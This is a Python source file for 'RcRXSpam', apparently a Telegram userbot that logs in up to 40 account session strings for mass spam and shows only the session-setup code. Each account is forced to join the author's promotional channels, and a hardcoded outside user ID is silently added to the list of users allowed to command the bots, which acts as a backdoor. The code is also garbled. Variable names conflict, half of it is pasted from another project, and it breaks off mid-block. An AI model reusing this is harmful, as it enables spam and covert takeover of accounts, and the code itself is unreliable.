# RcRXSpam - Spam Userbots
# Copyright © 2021 @RCRoWNER

import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

rcrversion = "v2.0.1"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 1517994352 not in SUDO_USERS:
    SUDO_USERS.append(2057364136)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DEV = list(map(int, getenv("FULLSUDO").split()))
DB_URI = config("DATABASE_URL", None)
DEV.append(OWNER_ID)
SUDO_USERS.append(OWNER_ID)

# Sessions
async def RcRX():
    global RcR
    global RcR2
    global RcR3
    global RcR5
    global RcR4
    global RcR6
    global RcR7
    global RcR8
    global RcR9
    global RcR10
    global RcR11
    global RcR12
    global RcR13
    global RcR14
    global Rcr15
    global RcR16
    global RcR17
    global RcR18
    global RcR19
    global RcR20
    global RcR21
    global RcR22
    global RcR23
    global RcR25
    global RcR24
    global RcR26
    global RcR27
    global RcR28
    global RcR29
    global RcR30
    global RcR31
    global RcR32
    global RcR33
    global RcR34
    global RcR35
    global RcR36
    global RcR37
    global RcR38
    global RcR39
    global RcR40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        Riz = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await RcR.start()
            botme = await RcR.get_me()
            await RcR(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR(functions.channels.JoinChannelRequest(channel="@RCR_SPAM"))
            await RcR(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            RcR = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "RCRxHELL"
        RcR = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        RcR2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await RcR2.start()
            await RcR2(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR2(functions.channels.JoinChannelRequest(channel="@RCR_SPAM"))
            await RcR2(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
            botme = await RcR2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "rcrxspam"
        Riz2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        RcR3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await  RcR3.start()
            await RcR3(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR3(functions.channels.JoinChannelRequest(channel="@RCR_SPAM"))
            await RcR3(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
            botme = await Riz3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "rcrxspam"
        RcR3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        RcR4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await RcR4.start()
            await RcR4(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR4(functions.channels.JoinChannelRequest(channel="@RCR_SPAM"))
            await RcR4(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
            botme = await Riz4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "rcrxspam"
        Riz4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        Riz5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await RcR5.start()
            await RcR5(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR5(functions.channels.JoinChannelRequest(channel="@RCR_SPAM"))
            await RcR5(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
                                 
            botme = await RcR5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "rcrxspam"
        RcR5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        RcR6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await RcR6.start()
            await RcR6(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR6(functions.channels.JoinChannelRequest(channel="@RCR_SPAN"))
            await RcR6(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
            botme = await RcR6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "rcrxspam"
        RcR6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        RcR7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await RcR7.start()
            await RcR7(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR7(functions.channels.JoinChannelRequest(channel="@RCR_SPAM"))
            await RcR7(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
            botme = await RcR7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "rcrxspam"
        Riz7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        Riz8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await RcR8.start()
            await RcR8(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR8(functions.channels.JoinChannelRequest(channel="@RCR_SPAM"))
            await RcR8(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
            botme = await Riz8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "rcrxspam"
        Riz8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        RcR9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await RcR9.start()
            await RcR9(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR9(functions.channels.JoinChannelRequest(channel="@RCR_SPAM"))
            await RcR9(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
            botme = await RcR9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "rcrxspam"
        RcR9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        Rcr10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await RcR10.start()
            await RcR10(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR10(functions.channels.JoinChannelRequest(channel="@RCR_SPAM"))
            await RcR10(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
            botme = await RcR10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "rcrxspam"
        RcR10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        RcR11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await RcR11.start()
            await RcR11(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR11(functions.channels.JoinChannelRequest(channel="@RCR_SPAM"))
            await RcR11(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
            botme = await RcR11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = "rcrxspam"
        RcR11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        RcR12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await RcR12.start()
            await RcR12(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR12(functions.channels.JoinChannelRequest(channel="@RCR_SPAM"))
            await RcR12(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
            botme = await RcR12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = "rcrxspam"
        Riz12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        RcR13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await RcR13.start()
            await RcR13(functions.channels.JoinChannelRequest(channel="@RCR_OFFICIAL"))
            await RcR13(functions.channels.JoinChannelRequest(channel="@RCR_SPAM"))
            await RcR13(functions.channels.JoinChannelRequest(channel="@RCRxHELL"))
            botme = await RcR13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = "rcrxspam"
        RcR13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await RcR13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        Riz14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await Riz14.start()
            await Riz14(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz14(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz14(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = "rizoelxspam"
        Riz14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        Riz15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await Riz15.start()
            await Riz15(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz15(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz15(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "rizoelxspam"
        Riz15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        Riz16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await Riz16.start()
            botme = await Riz16.get_me()
            await Riz16(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz16(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz16(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = "rizoelxspam"
        Riz16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        Riz17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await Riz17.start()
            botme = await Riz17.get_me()
            await Riz17(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz17(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz17(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = "rizoelxspam"
        Riz17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        Riz18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Riz18.start()
            botme = await Riz18.get_me()
            await Riz18(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz18(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz18(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = "rizoelxspam"
        Riz18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        Riz19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await Riz19.start()
            botme = await Riz19.get_me()
            await Riz19(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz19(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz19(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = "rizoelxspam"
        Riz19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        Riz20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await Riz20.start()
            botme = await Riz20.get_me()
            await Riz20(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz20(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz20(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = "rizoelxspam"
        Riz20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz20.start()
        except Exception as e:
            pass

    if STRING21:
        session_name = str(STRING21)
        print("String 21 Found")
        Riz21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 21")
            await Riz21.start()
            botme = await Riz21.get_me()
            await Riz21(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz21(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz21(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        session_name = "rizoelxspam"
        Riz21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz21.start()
        except Exception as e:
            pass
   
    if STRING22:
        session_name = str(STRING22)
        print("String 22 Found")
        Riz22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Riz22.start()
            await Riz22(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz22(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz22(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz22.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        pass
        session_name = "rizoelxspam"
        Riz22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz22.start()
        except Exception as e:
            pass

    if STRING23:
        session_name = str(STRING23)
        print("String 23 Found")
        Riz23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 23")
            await  Riz23.start()
            await Riz23(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz23(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz23(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz23.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        pass
        session_name = "rizoelxspam"
        Riz23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz23.start()
        except Exception as e:
            pass

    if STRING24:
        session_name = str(STRING24)
        print("String 24 Found")
        Riz24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 24")
            await Riz24.start()
            await Riz24(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz24(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz24(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz24.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        pass
        session_name = "rizoelxspam"
        Riz24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz24.start()
        except Exception as e:
            pass

    if STRING25:
        session_name = str(STRING25)
        print("String 25 Found")
        Riz25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Riz25.start()
            await Riz25(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz25(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz25(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz25.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        pass
        session_name = "rizoelxspam"
        Riz25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz25.start()
        except Exception as e:
            pass
                  
    if STRING26:
        session_name = str(STRING26)
        print("String 36 Found")
        Riz26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 26")
            await Riz26.start()
            await Riz26(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz26(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz26(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz26.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 not Found")
        pass
        session_name = "rizoelxspam"
        Riz26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz26.start()
        except Exception as e:
            pass

    if STRING27:
        session_name = str(STRING27)
        print("String 27 Found")
        Riz27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 27")
            await Riz27.start()
            await Riz27(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz27(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz27(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz27.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 not Found")
        pass
        session_name = "rizoelxspam"
        Riz27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz27.start()
        except Exception as e:
            pass    
        
    
    if STRING28:
        session_name = str(STRING28)
        print("String 28 Found")
        Riz28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await Riz28.start()
            await Riz28(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz28(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz28(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz28.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 not Found")
        pass
        session_name = "rizoelxspam"
        Riz28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz28.start()
        except Exception as e:
            pass   
        
    if STRING29:
        session_name = str(STRING29)
        print("String 29 Found")
        Riz29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 29")
            await Riz29.start()
            await Riz29(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz29(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz29(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz29.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 not Found")
        pass
        session_name = "rizoelxspam"
        Riz29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz29.start()
        except Exception as e:
            pass   
    
  
    if STRING30:
        session_name = str(STRING30)
        print("String 30 Found")
        Riz30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 30")
            await Riz30.start()
            await Riz30(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz30(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz30(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz30.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 not Found")
        pass
        session_name = "rizoelxspam"
        Riz30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz30.start()
        except Exception as e:
            pass 
        
    
    if STRING31:
        session_name = str(STRING31)
        print("String 31 Found")
        Riz31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await Riz31.start()
            await Riz31(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz31(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz31(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz31.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        pass
        session_name = "rizoelxspam"
        Riz31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz31.start()
        except Exception as e:
            pass
        
    
    if STRING32:
        session_name = str(STRING32)
        print("String 32 Found")
        Riz32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await Riz32.start()
            await Riz32(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz32(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz32(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz32.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 32 not Found")
        pass
        session_name = "rizoelxspam"
        Riz32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz32.start()
        except Exception as e:
            pass   
    
  
    if STRING33:
        session_name = str(STRING33)
        print("String 33  Found")
        Riz33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 33")
            await Riz33.start()
            await Riz33(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz33(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz33(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz33.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 33 not Found")
        pass
        session_name = "rizoelxspam"
        Riz33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz33.start()
        except Exception as e:
            pass 
        
    
    if STRING34:
        session_name = str(STRING34)
        print("String 34 Found")
        Riz34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 34")
            await Riz34.start()
            await Riz34(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz34(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz34(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz34.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 34 not Found")
        pass
        session_name = "rizoelxspam"
        Riz34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz34.start()
        except Exception as e:
            pass
        
    
    if STRING35:
        session_name = str(STRING35)
        print("String 35 Found")
        Riz35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await Riz35.start()
            await Riz35(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz35(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz35(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
            botme = await Riz35.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 35 not Found")
        pass
        session_name = "rizoelxspam"
        Riz35 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await Riz35.start()
        except Exception as e:
            pass


    if STRING36:
        session_name = str(STRING36)
        print("String 36 Found")
        Riz36 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 36")
            await Riz36.start()
            botme = await Riz36.get_me()
            await Riz36(functions.channels.JoinChannelRequest(channel="@RiZoeLX"))
            await Riz36(functions.channels.JoinChannelRequest(channel="@DNHxHELL"))
            await Riz36(functions.channels.JoinChannelRequest(channel="@Gladiators_Projects"))
